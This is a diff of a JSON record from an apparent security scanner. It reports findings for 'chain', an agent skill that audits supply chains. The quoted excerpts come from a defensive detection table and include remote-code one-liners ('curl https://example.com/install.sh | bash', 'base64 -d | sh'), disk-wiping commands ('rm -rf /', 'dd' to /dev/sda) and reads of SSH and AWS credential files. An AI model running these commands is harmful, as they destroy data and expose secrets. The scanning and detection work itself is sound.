@@ -4,74 +4,197 @@
   "repo": "agent-skills",
   "path": "chain",
   "name": "chain",
-  "description": "Auditing skill/plugin/MCP supply chains and live package compromise: manifests, hidden injection, IoC scans, persistence-first eradication, and gated credential rotation. Not for app SAST (Sentinel).",
+  "description": "",
   "stars": 99,
   "category": "coding",
-  "commit": "2e02cc9efb3852a45334495df3784d59b87b0e18",
+  "commit": "6a5dd4048cb4c7d5467d567ff66fa91c3655625a",
   "contentHash": "05178587fecbc375891e90b54359adb2eeeca38cace3f6380eeb419d5d2c4fc2",
   "repoCreatedAt": "2026-01-07T04:26:40Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-07T22:05:48.475Z",
+  "scannedAt": "2026-11-09T10:28:36.295Z",
   "scan": {
     "findings": [
       {
         "ruleId": "downloads-code",
-        "file": "chain/SKILL.md",
-        "line": 57,
-        "excerpt": "- a Unicode anomaly or `curl ... | bash` pattern is suspected inside any agent-loaded file",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 25,
+        "excerpt": "| `curl ... \\| bash` / `curl ... \\| sh` | `P0` | `curl https://example.com/install.sh \\| bash` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 25,
+        "excerpt": "| `curl ... \\| bash` / `curl ... \\| sh` | `P0` | `curl https://example.com/install.sh \\| bash` |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "example.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 26,
+        "excerpt": "| `wget -qO- ... \\| sh` | `P0` | unpinned remote execution |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 26,
+        "excerpt": "| `wget -qO- ... \\| sh` | `P0` | unpinned remote execution |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 28,
+        "excerpt": "| `bash -c \"$(curl ...)\"` / `sh -c \"$(curl ...)\"` | `P0` | same |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 28,
+        "excerpt": "| `bash -c \"$(curl ...)\"` / `sh -c \"$(curl ...)\"` | `P0` | same |",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "obfuscated",
-        "file": "chain/SKILL.md",
-        "line": 100,
-        "excerpt": "- Scan every bundled `.sh`, `.py`, `.js`, `.ts` file for `curl ... | bash`, `wget ... | sh`, `eval $(...)`, `base64 -d | sh`, network exfil to non-allowlisted h",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 29,
+        "excerpt": "| `base64 -d \\| sh` / `base64 \\| bash` | `P0` | hidden payload |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 33,
+        "excerpt": "| `rm -rf $HOME`, `rm -rf /`, `dd if=/dev/zero of=/dev/sda` | `P0` | destructive |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 34,
+        "excerpt": "| `cat ~/.ssh/id_*`, `cat ~/.aws/credentials`, `cat ~/.netrc` | `P0` | credential exfil |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 63,
+        "excerpt": "| `subprocess.*(shell=True, ...)` with concatenated input | `P0` | shell injection |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 64,
+        "excerpt": "| `os.system(...)` with non-literal | `P0` | same |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 65,
+        "excerpt": "| `requests.get / post / urllib.request.urlopen` to non-allowlisted host | `P1` | undeclared egress |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 74,
+        "excerpt": "-e 'subprocess\\.[A-Za-z_]+\\([^)]*shell=True' \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 84,
+        "excerpt": "| `child_process.exec(...)` / `execSync(...)` with concatenated input | `P0` | shell injection |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 88,
+        "excerpt": "| `fetch(...)` / `axios(...)` to non-allowlisted host | `P1` | undeclared egress |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 94,
+        "excerpt": "-e 'child_process\\.(exec|execSync|spawn)\\(' \\",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "chain/SKILL.md",
-        "line": 100,
-        "excerpt": "- Scan every bundled `.sh`, `.py`, `.js`, `.ts` file for `curl ... | bash`, `wget ... | sh`, `eval $(...)`, `base64 -d | sh`, network exfil to non-allowlisted h",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 200,
+        "excerpt": "excerpt: \"curl https://example.com/install.sh | bash\"",
         "disclosed": false,
         "automatic": false
       },
       {
-        "ruleId": "obfuscated",
-        "file": "chain/SKILL.md",
-        "line": 192,
-        "excerpt": "| `base64 -d \\| sh` / `base64 \\| bash` | hidden payload execution |",
+        "ruleId": "network",
+        "file": "chain/reference/bundled-artifact-review.md",
+        "line": 200,
+        "excerpt": "excerpt: \"curl https://example.com/install.sh | bash\"",
         "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "chain/SKILL.md",
-        "line": 193,
-        "excerpt": "| `curl ... \\| bash`, `wget ... \\| sh` | unpinned remote code execution |",
-        "disclosed": false,
-        "automatic": false
+        "automatic": false,
+        "hosts": [
+          "example.com"
+        ]
       }
     ],
     "findingTotals": {
-      "downloads-code": 3,
-      "obfuscated": 2
+      "downloads-code": 4,
+      "network": 5,
+      "shell": 6,
+      "obfuscated": 1,
+      "writes-outside": 1,
+      "reads-secrets": 1
     },
-    "score": 60,
-    "band": "review",
+    "score": 20,
+    "band": "high",
     "rulesVersion": "1.3.0",
-    "filesScanned": 3,
-    "filesSkipped": 12
+    "filesScanned": 2,
+    "filesSkipped": 13
   },
   "history": [
     {
       "commit": "2e02cc9efb3852a45334495df3784d59b87b0e18",
       "scannedAt": "2026-11-07T22:05:48.475Z",
       "score": 60,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "6a5dd4048cb4c7d5467d567ff66fa91c3655625a",
+      "scannedAt": "2026-11-09T10:28:36.295Z",
+      "score": 20,
       "rulesVersion": "1.3.0"
     }
   ]
